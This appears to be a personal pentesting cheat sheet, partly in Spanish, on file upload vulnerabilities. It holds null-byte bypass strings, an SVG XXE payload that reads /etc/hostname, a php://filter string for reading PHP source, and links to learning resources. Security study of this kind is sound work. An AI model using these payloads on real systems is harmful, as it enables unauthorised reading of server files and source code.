
![[file-upload-mindmap.png|1224]]

# Protips
## Null bytes
```
%00
\x00
```
## SVG XXE
```xml
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
```

Si hay que leer PHP

```
php://filter/convert.base64-encode/resource=file.php
```


### Artículos
[File upload vulnerabilities (PortSwigger)](https://portswigger.net/web-security/file-upload)
[PayLoadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files#methodology)
[Demostración upload bypass](https://youtu.be/rAyws427ZW8?list=PL65_wYSEg5HdSq1pSZxQmz7SoNE48vOgR)